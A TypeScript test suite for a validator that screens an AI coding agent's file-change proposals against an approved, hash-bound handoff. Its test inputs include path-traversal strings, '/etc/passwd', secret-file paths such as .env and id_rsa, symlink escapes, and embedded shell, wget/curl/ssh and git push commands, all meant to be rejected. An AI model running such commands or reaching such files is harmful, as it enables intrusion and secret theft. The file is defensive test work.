import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { mkdtemp, mkdir, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { AiHandoffPackage } from "../localCodingAiHandoffService.js";
import {
  AI_PROPOSAL_POLICY_LIMITS,
  computeAiHandoffPackageHash,
  computeAiProposalRepositoryHash,
  validateAiProposalPolicy,
  type AiProposalPolicyHandoffContext,
} from "../localCodingAiProposalPolicyService.js";

const TASK_ID = "11111111-1111-4111-8111-111111111111";
const BASE_SHA = "a".repeat(40);
const PATCH_SHA = "b".repeat(64);
const NOW = new Date("2026-09-24T14:00:00.000Z");

function makePackage(allowedFiles = ["src/payment.ts"]): AiHandoffPackage {
  return {
    version: 1,
    task: {
      id: TASK_ID,
      projectName: "AI proposal policy",
      instruction: "Fix the bounded coding task.",
    },
    repository: {
      repository: "Travelintrips/Core-AI-Foundation",
      branch: "feat/coding-ai-policy-validator",
      baseHeadSha: BASE_SHA,
    },
    reason: "Deterministic recovery exhausted.",
    allowedFiles,
    diagnostics: [],
    snippets: [],
    symbols: [],
    dependencies: [],
    relatedTests: [],
    recentCommits: [],
    verificationCommands: ["pnpm typecheck", "pnpm test"],
    currentPatch: {
      sha256: PATCH_SHA,
      excerpt: "diff --git a/src/payment.ts b/src/payment.ts",
      truncated: false,
    },
    policy: {
      readOnlyContext: true,
      repositoryAccess: false,
      networkAccess: false,
      shellAccess: false,
      secretAccess: false,
      sourceWrite: false,
      commitPushMerge: false,
      modelInvoked: false,
      requiresExplicitApprovalBeforeModel: true,
      allowedFilesOnly: true,
    },
  };
}

function makeHandoff(pkg = makePackage()): AiProposalPolicyHandoffContext {
  return {
    package: pkg,
    packageHash: computeAiHandoffPackageHash(pkg),
    approvedAt: "2026-09-24T13:55:00.000Z",
    expiresAt: "2026-09-24T14:10:00.000Z",
    status: "APPROVED",
    revokedAt: null,
  };
}

function makeProposal(pkg = makePackage(), operations: unknown[] = [
  { kind: "replace_file", path: "src/payment.ts", content: "export const payment = 1;" },
]) {
  return {
    taskId: pkg.task.id,
    packageHash: computeAiHandoffPackageHash(pkg),
    repositoryHash: computeAiProposalRepositoryHash(pkg.repository),
    repository: { ...pkg.repository },
    patchSha256: pkg.currentPatch.sha256,
    operations,
  };
}

function codes(result: Awaited<ReturnType<typeof validateAiProposalPolicy>>): string[] {
  return result.ok ? [] : result.errors.map((item) => item.code);
}

describe("Local Coding AI Proposal Policy", () => {
  let root = "";

  beforeEach(async () => {
    root = await mkdtemp(join(tmpdir(), "ai-proposal-policy-"));
    await mkdir(join(root, "src"), { recursive: true });
    await writeFile(join(root, "src/payment.ts"), "export const payment = 0;\n", "utf8");
  });

  afterEach(async () => {
    if (root) await rm(root, { recursive: true, force: true });
  });

  async function validate(
    proposal: unknown = makeProposal(),
    handoff: AiProposalPolicyHandoffContext = makeHandoff(),
    inputOverrides: Partial<{
      repositoryRoot: string;
      currentRepositoryHeadSha: string;
      currentPatchSha256: string;
      now: Date;
    }> = {},
  ) {
    return validateAiProposalPolicy({
      proposal,
      handoff,
      repositoryRoot: inputOverrides.repositoryRoot ?? root,
      currentRepositoryHeadSha: inputOverrides.currentRepositoryHeadSha ?? BASE_SHA,
      currentPatchSha256: inputOverrides.currentPatchSha256 ?? PATCH_SHA,
      now: inputOverrides.now ?? NOW,
    });
  }

  it("accepts a bounded file-only proposal bound to the approved handoff", async () => {
    const result = await validate();
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.files).toEqual(["src/payment.ts"]);
      expect(result.operations[0]).toMatchObject({
        kind: "replace_file",
        path: "src/payment.ts",
      });
    }
  });

  it.each([
    "create_file",
    "replace_file",
    "update_file",
    "patch_file",
    "delete_file",
  ])("accepts the allowlisted operation kind %s", async (kind) => {
    const result = await validate(makeProposal(makePackage(), [{ kind, path: "src/payment.ts", content: "x" }]));
    expect(result.ok).toBe(true);
  });

  it("rejects files outside allowedFiles", async () => {
    const result = await validate(makeProposal(makePackage(), [
      { kind: "replace_file", path: "src/other.ts", content: "x" },
    ]));
    expect(codes(result)).toContain("FILE_NOT_ALLOWED");
  });

  it.each([
    "../outside.ts",
    "src/../../outside.ts",
    "src/%2e%2e/outside.ts",
    "src/%252e%252e/outside.ts",
    "src\\..\\outside.ts",
  ])("rejects path traversal: %s", async (path) => {
    const result = await validate(makeProposal(makePackage(), [
      { kind: "replace_file", path, content: "x" },
    ]));
    expect(codes(result)).toContain("PATH_TRAVERSAL");
  });

  it.each([
    "/etc/passwd",
    "C:\\Windows\\system.ini",
    "\\\\server\\share\\file.ts",
  ])("rejects absolute paths: %s", async (path) => {
    const result = await validate(makeProposal(makePackage(), [
      { kind: "replace_file", path, content: "x" },
    ]));
    expect(codes(result)).toContain("ABSOLUTE_PATH");
  });

  it.each([
    ".env",
    ".env.production",
    "config/secrets/api.json",
    "config/private-key.pem",
    "certs/server.key",
    "certs/client.p12",
    "keys/id_rsa",
  ])("rejects sensitive file path: %s", async (path) => {
    const pkg = makePackage([path]);
    const result = await validate(makeProposal(pkg, [{ kind: "replace_file", path, content: "x" }]), makeHandoff(pkg));
    expect(codes(result)).toContain("SENSITIVE_FILE");
  });

  it("rejects an unknown operation", async () => {
    const result = await validate(makeProposal(makePackage(), [
      { kind: "run_shell", path: "src/payment.ts", command: "echo owned" },
    ]));
    expect(codes(result)).toContain("UNKNOWN_OPERATION");
  });

  it("rejects a malformed operation object", async () => {
    const result = await validate(makeProposal(makePackage(), ["replace_file"]));
    expect(codes(result)).toContain("MALFORMED_OPERATION");
  });

  it("rejects an operation without a path", async () => {
    const result = await validate(makeProposal(makePackage(), [
      { kind: "replace_file", content: "x" },
    ]));
    expect(codes(result)).toContain("MALFORMED_OPERATION");
  });

  it("rejects an oversized operation payload", async () => {
    const result = await validate(makeProposal(makePackage(), [
      {
        kind: "replace_file",
        path: "src/payment.ts",
        content: "x".repeat(AI_PROPOSAL_POLICY_LIMITS.maxOperationBytes + 1),
      },
    ]));
    expect(codes(result)).toContain("PAYLOAD_OVERSIZED");
  });

  it("rejects an oversized total proposal payload", async () => {
    const proposal = makeProposal();
    (proposal as Record<string, unknown>).padding = "x".repeat(AI_PROPOSAL_POLICY_LIMITS.maxPayloadBytes + 1);
    const result = await validate(proposal);
    expect(codes(result)).toContain("PAYLOAD_OVERSIZED");
  });

  it("rejects too many operations", async () => {
    const operations = Array.from(
      { length: AI_PROPOSAL_POLICY_LIMITS.maxOperations + 1 },
      () => ({ kind: "replace_file", path: "src/payment.ts", content: "x" }),
    );
    const result = await validate(makeProposal(makePackage(), operations));
    expect(codes(result)).toContain("TOO_MANY_OPERATIONS");
  });

  it("rejects too many unique files", async () => {
    const paths = Array.from(
      { length: AI_PROPOSAL_POLICY_LIMITS.maxFiles + 1 },
      (_, index) => "src/file-" + index + ".ts",
    );
    const pkg = makePackage(paths);
    for (const path of paths) await writeFile(join(root, path), "x", "utf8");
    const operations = paths.map((path) => ({ kind: "replace_file", path, content: "x" }));
    const result = await validate(makeProposal(pkg, operations), makeHandoff(pkg));
    expect(codes(result)).toContain("TOO_MANY_FILES");
    expect(codes(result)).toContain("HANDOFF_POLICY_INVALID");
  });

  it("rejects a package hash mismatch in the proposal", async () => {
    const proposal = makeProposal();
    proposal.packageHash = "c".repeat(64);
    const result = await validate(proposal);
    expect(codes(result)).toContain("PACKAGE_HASH_MISMATCH");
  });

  it("rejects a tampered approved handoff package", async () => {
    const pkg = makePackage();
    const handoff = makeHandoff(pkg);
    pkg.task.instruction = "tampered after approval";
    const result = await validate(makeProposal(pkg), handoff);
    expect(codes(result)).toContain("PACKAGE_HASH_MISMATCH");
  });

  it("rejects a repository hash mismatch", async () => {
    const proposal = makeProposal();
    proposal.repositoryHash = "d".repeat(64);
    const result = await validate(proposal);
    expect(codes(result)).toContain("REPOSITORY_HASH_MISMATCH");
  });

  it("rejects repository identity mismatch", async () => {
    const proposal = makeProposal();
    proposal.repository.repository = "attacker/repo";
    const result = await validate(proposal);
    expect(codes(result)).toContain("REPOSITORY_MISMATCH");
  });

  it("rejects branch mismatch", async () => {
    const proposal = makeProposal();
    proposal.repository.branch = "main";
    const result = await validate(proposal);
    expect(codes(result)).toContain("REPOSITORY_MISMATCH");
  });

  it("rejects base SHA mismatch", async () => {
    const proposal = makeProposal();
    proposal.repository.baseHeadSha = "e".repeat(40);
    const result = await validate(proposal);
    expect(codes(result)).toContain("BASE_SHA_MISMATCH");
  });

  it("rejects patch SHA mismatch", async () => {
    const proposal = makeProposal();
    proposal.patchSha256 = "f".repeat(64);
    const result = await validate(proposal);
    expect(codes(result)).toContain("PATCH_SHA_MISMATCH");
  });

  it("rejects task binding mismatch", async () => {
    const proposal = makeProposal();
    proposal.taskId = "22222222-2222-4222-8222-222222222222";
    const result = await validate(proposal);
    expect(codes(result)).toContain("TASK_MISMATCH");
  });

  it("rejects a stale handoff when repository HEAD changed", async () => {
    const result = await validate(makeProposal(), makeHandoff(), {
      currentRepositoryHeadSha: "1".repeat(40),
    });
    expect(codes(result)).toContain("STALE_HANDOFF");
  });

  it("rejects a stale handoff when the current patch changed", async () => {
    const result = await validate(makeProposal(), makeHandoff(), {
      currentPatchSha256: "2".repeat(64),
    });
    expect(codes(result)).toContain("STALE_HANDOFF");
  });

  it("rejects an expired handoff", async () => {
    const handoff = makeHandoff();
    handoff.expiresAt = "2026-09-24T13:59:59.999Z";
    const result = await validate(makeProposal(), handoff);
    expect(codes(result)).toContain("EXPIRED_HANDOFF");
  });

  it("rejects a revoked handoff by status", async () => {
    const handoff = makeHandoff();
    handoff.status = "REVOKED";
    const result = await validate(makeProposal(), handoff);
    expect(codes(result)).toContain("REVOKED_HANDOFF");
  });

  it("rejects a revoked handoff by revokedAt", async () => {
    const handoff = makeHandoff();
    handoff.revokedAt = "2026-09-24T13:58:00.000Z";
    const result = await validate(makeProposal(), handoff);
    expect(codes(result)).toContain("REVOKED_HANDOFF");
  });

  it("rejects invalid or future approval timestamps as stale", async () => {
    const invalid = makeHandoff();
    invalid.approvedAt = "not-a-date";
    expect(codes(await validate(makeProposal(), invalid))).toContain("STALE_HANDOFF");

    const future = makeHandoff();
    future.approvedAt = "2026-09-24T14:01:00.000Z";
    expect(codes(await validate(makeProposal(), future))).toContain("STALE_HANDOFF");
  });

  it("rejects a handoff whose security policy was weakened", async () => {
    const pkg = makePackage();
    (pkg.policy as { networkAccess: boolean }).networkAccess = true;
    const handoff = makeHandoff(pkg);
    const result = await validate(makeProposal(pkg), handoff);
    expect(codes(result)).toContain("HANDOFF_POLICY_INVALID");
  });

  it("rejects explicit shell requests", async () => {
    const proposal = makeProposal();
    (proposal as Record<string, unknown>).shell = true;
    const result = await validate(proposal);
    expect(codes(result)).toContain("FORBIDDEN_SHELL");
  });

  it("rejects explicit network requests", async () => {
    const proposal = makeProposal();
    (proposal as Record<string, unknown>).network = { enabled: true };
    const result = await validate(proposal);
    expect(codes(result)).toContain("FORBIDDEN_NETWORK");
  });

  it("rejects explicit git capability requests", async () => {
    const proposal = makeProposal();
    (proposal as Record<string, unknown>).tools = ["git"];
    const result = await validate(proposal);
    expect(codes(result)).toContain("FORBIDDEN_GIT_ACTION");
  });

  it.each([
    "git commit -am hacked",
    "git push origin main",
    "git merge attacker",
    "commit the changes",
    "push changes",
    "merge branch",
  ])("rejects commit/push/merge intent: %s", async (request) => {
    const proposal = makeProposal(makePackage(), [
      { kind: "replace_file", path: "src/payment.ts", content: request },
    ]);
    const result = await validate(proposal);
    expect(codes(result)).toContain("FORBIDDEN_GIT_ACTION");
  });

  it.each([
    "bash -lc whoami",
    "powershell Get-ChildItem",
  ])("rejects shell commands embedded in operation payload: %s", async (request) => {
    const proposal = makeProposal(makePackage(), [
      { kind: "replace_file", path: "src/payment.ts", content: request },
    ]);
    const result = await validate(proposal);
    expect(codes(result)).toContain("FORBIDDEN_SHELL");
  });

  it.each([
    "curl https://example.com",
    "wget https://example.com/payload",
    "ssh attacker@example.com",
  ])("rejects network commands embedded in operation payload: %s", async (request) => {
    const proposal = makeProposal(makePackage(), [
      { kind: "replace_file", path: "src/payment.ts", content: request },
    ]);
    const result = await validate(proposal);
    expect(codes(result)).toContain("FORBIDDEN_NETWORK");
  });

  it("fails closed when the repository root cannot be resolved", async () => {
    const result = await validate(makeProposal(), makeHandoff(), {
      repositoryRoot: join(root, "missing-root"),
    });
    expect(codes(result)).toContain("SYMLINK_ESCAPE");
  });

  it("rejects a symlink escape outside the repository", async () => {
    const outside = await mkdtemp(join(tmpdir(), "ai-proposal-outside-"));
    try {
      await writeFile(join(outside, "owned.ts"), "x", "utf8");
      await symlink(outside, join(root, "src/link"), "dir");
      const pkg = makePackage(["src/link/owned.ts"]);
      const result = await validate(
        makeProposal(pkg, [{ kind: "replace_file", path: "src/link/owned.ts", content: "x" }]),
        makeHandoff(pkg),
      );
      expect(codes(result)).toContain("SYMLINK_ESCAPE");
    } finally {
      await rm(outside, { recursive: true, force: true });
    }
  });

  it("allows a symlink that resolves to a location inside the repository", async () => {
    await mkdir(join(root, "real"), { recursive: true });
    await writeFile(join(root, "real/payment.ts"), "x", "utf8");
    await symlink(join(root, "real"), join(root, "src/link"), "dir");
    const pkg = makePackage(["src/link/payment.ts"]);
    const result = await validate(
      makeProposal(pkg, [{ kind: "replace_file", path: "src/link/payment.ts", content: "x" }]),
      makeHandoff(pkg),
    );
    expect(result.ok).toBe(true);
  });

  it("rejects unsafe entries already present in approved allowedFiles", async () => {
    const pkg = makePackage(["src/payment.ts", "../outside.ts"]);
    const result = await validate(makeProposal(pkg), makeHandoff(pkg));
    expect(codes(result)).toContain("HANDOFF_POLICY_INVALID");
  });

  it("rejects malformed proposal root and missing operations", async () => {
    expect(codes(await validate(null))).toContain("MALFORMED_PROPOSAL");

    const proposal = makeProposal() as Record<string, unknown>;
    delete proposal.operations;
    expect(codes(await validate(proposal))).toContain("MALFORMED_PROPOSAL");
  });

  it("normalizes harmless dot segments but keeps exact allowed-file binding", async () => {
    const result = await validate(makeProposal(makePackage(), [
      { kind: "replace_file", path: "./src/./payment.ts", content: "x" },
    ]));
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.files).toEqual(["src/payment.ts"]);
  });
});
